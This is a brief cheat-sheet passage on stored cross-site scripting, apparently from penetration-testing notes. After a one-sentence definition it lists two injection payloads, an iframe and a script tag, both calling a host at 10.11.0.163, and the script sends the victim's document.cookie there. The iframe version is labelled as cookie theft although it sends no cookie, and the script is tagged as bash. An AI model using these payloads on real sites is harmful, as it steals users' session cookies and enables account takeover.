Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data (e.g. taking it from the database) within its later HTTP responses in an unsafe way.

## Stored XSS payloads

Stealing cookies via iframe:

```html
<iframe SRC="http://10.11.0.163/gimmecookie" height = "0" width ="0"></iframe>
```

or using an image link:

```bash
<script>
new Image().src="http://10.11.0.163/gimmecookie?output="+document.cookie;
</script>
```
